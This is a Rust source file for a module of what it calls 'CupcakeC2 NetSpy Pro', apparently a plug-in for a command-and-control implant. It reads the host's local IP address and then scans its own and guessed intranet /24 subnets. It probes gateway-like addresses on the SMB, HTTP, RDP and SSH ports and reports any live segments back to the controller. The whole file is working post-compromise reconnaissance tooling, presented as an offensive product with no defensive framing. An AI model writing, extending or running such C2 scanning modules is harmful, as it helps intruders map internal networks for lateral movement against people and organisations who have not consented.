#![no_std]
#![no_main]

use core::panic::PanicInfo;

extern "C" {
    fn host_call(api_hash: u32, params_ptr: *const u8) -> u64;
    fn host_report_result(data_ptr: *const u8, length: u32);
}

const HASH_TCP_CONNECT: u32 = 0xA1B2C3D4;
const HASH_GET_NET_INFO: u32 = 0xC0FFEE10;

#[repr(C, packed)]
struct TcpConnectParams {
    target_ip: u32,
    port: u16,
    timeout_ms: u32,
}

#[repr(C, packed)]
struct GetNetInfoParams {
    buffer_ptr: *const u8,
    buffer_size: u32,
}

#[no_mangle]
pub extern "C" fn run_skill(_pid: u32) {
    report("\n[+] ==========================================\n");
    report("[+]        CupcakeC2 NetSpy Pro v3.1        \n");
    report("[+] ==========================================\n\n");

    // Phase 1: Local Discovery
    let mut ip_buf = [0u8; 64];
    let params = GetNetInfoParams {
        buffer_ptr: ip_buf.as_ptr(),
        buffer_size: ip_buf.len() as u32,
    };
    
    let len = unsafe { host_call(HASH_GET_NET_INFO, &params as *const _ as *const u8) };
    if len > 0 {
        let ip_str = unsafe { core::str::from_utf8_unchecked(&ip_buf[..len as usize]) };
        report("[*] Detected local primary IP: ");
        report(ip_str);
        report("\n");
        
        // Phase 2: Identify and Scan Subnets
        // Simple parsing for IPv4 (octets)
        let mut octets = [0u8; 4];
        if parse_ipv4(ip_str, &mut octets) {
            report("[*] Starting Spy Mode discovery for ");
            report_ip_prefix(octets[0], octets[1], octets[2]);
            report("0/24...\n\n");
            
            // Scan current C segment
            scan_survival_segment(octets[0], octets[1], octets[2]);
            
            // Guess other likely segments (e.g. 192.168.x.0/24)
            report("\n[*] Probing other potential intranet segments...\n");
            let guesses = [0, 1, 2, 3, 10, 20, 30, 100, 178]; // Common class C subnets
            for &subnet in guesses.iter() {
                if subnet != octets[2] {
                    scan_survival_segment(octets[0], octets[1], subnet);
                }
            }
        }
    } else {
        report("[!] Failed to detect local network, falling back to 192.168.0.0/16\n");
        for subnet in 0..5 {
            scan_survival_segment(192, 168, subnet);
        }
    }
    
    report("\n[+] Scan Finished.\n");
}

fn scan_survival_segment(o1: u8, o2: u8, o3: u8) {
    // Survival detection theory: check .1 (gateway) or .254 on 445/80
    let targets = [1, 254, 2, 100];
    let ports = [445, 80, 3389, 22]; // SMB, HTTP, RDP, SSH
    
    let base_ip = ((o1 as u32) << 24) | ((o2 as u32) << 16) | ((o3 as u32) << 8);

    for &host in targets.iter() {
        let ip = base_ip | (host as u32);
        for &port in ports.iter() {
            if check_port(ip, port, 150) {
                report_survival(o1, o2, o3, host, port);
                return; // Segment found, move to next
            }
        }
    }
}

fn check_port(ip: u32, port: u16, timeout: u32) -> bool {
    let params = TcpConnectParams {
        target_ip: ip,
        port,
        timeout_ms: timeout,
    };
    unsafe {
        host_call(HASH_TCP_CONNECT, &params as *const _ as *const u8) != 0
    }
}

fn report(msg: &str) {
    unsafe { host_report_result(msg.as_ptr(), msg.len() as u32); }
}

fn report_survival(o1: u8, o2: u8, o3: u8, o4: u8, port: u16) {
    let mut buf = [0u8; 128];
    let mut idx = 0;
    
    let prefix = b"[+] Alive: ";
    buf[idx..idx+prefix.len()].copy_from_slice(prefix); idx += prefix.len();
    
    idx += format_u8(&mut buf[idx..], o1); buf[idx]=b'.'; idx+=1;
    idx += format_u8(&mut buf[idx..], o2); buf[idx]=b'.'; idx+=1;
    idx += format_u8(&mut buf[idx..], o3); 
    
    let suffix = b".0/24 (Sample: .";
    buf[idx..idx+suffix.len()].copy_from_slice(suffix); idx += suffix.len();
    
    idx += format_u8(&mut buf[idx..], o4);
    
    let port_txt = b" port ";
    buf[idx..idx+port_txt.len()].copy_from_slice(port_txt); idx += port_txt.len();
    
    idx += format_u16(&mut buf[idx..], port);
    
    buf[idx] = b')'; idx+=1;
    buf[idx] = b'\n'; idx+=1;

    unsafe { host_report_result(buf.as_ptr(), idx as u32); }
}

fn report_ip_prefix(o1: u8, o2: u8, o3: u8) {
    let mut buf = [0u8; 16];
    let mut idx = 0;
    idx += format_u8(&mut buf[idx..], o1); buf[idx]=b'.'; idx+=1;
    idx += format_u8(&mut buf[idx..], o2); buf[idx]=b'.'; idx+=1;
    idx += format_u8(&mut buf[idx..], o3); buf[idx]=b'.'; idx+=1;
    report(unsafe { core::str::from_utf8_unchecked(&buf[..idx]) });
}

// Minimal IPv4 parser
fn parse_ipv4(ip: &str, octets: &mut [u8; 4]) -> bool {
    let bytes = ip.as_bytes();
    let mut cur_octet = 0;
    let mut val = 0u8;
    let mut has_digits = false;
    
    for &b in bytes.iter() {
        if b >= b'0' && b <= b'9' {
            val = val.wrapping_mul(10).wrapping_add(b - b'0');
            has_digits = true;
        } else if b == b'.' {
            if cur_octet >= 3 || !has_digits { return false; }
            octets[cur_octet] = val;
            val = 0;
            cur_octet += 1;
            has_digits = false;
        } else {
            break; // Stop at first non-digit/dot
        }
    }
    if cur_octet == 3 && has_digits {
        octets[3] = val;
        return true;
    }
    false
}

fn format_u8(buf: &mut [u8], mut n: u8) -> usize {
    if n == 0 { buf[0] = b'0'; return 1; }
    let mut tmp = [0u8; 3];
    let mut len = 0;
    while n > 0 { tmp[len] = b'0' + (n % 10); n /= 10; len += 1; }
    for i in 0..len { buf[i] = tmp[len - 1 - i]; }
    len
}

fn format_u16(buf: &mut [u8], mut n: u16) -> usize {
    if n == 0 { buf[0] = b'0'; return 1; }
    let mut tmp = [0u8; 5];
    let mut len = 0;
    while n > 0 { tmp[len] = b'0' + (n % 10) as u8; n /= 10; len += 1; }
    for i in 0..len { buf[i] = tmp[len - 1 - i]; }
    len
}

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! { loop {} }
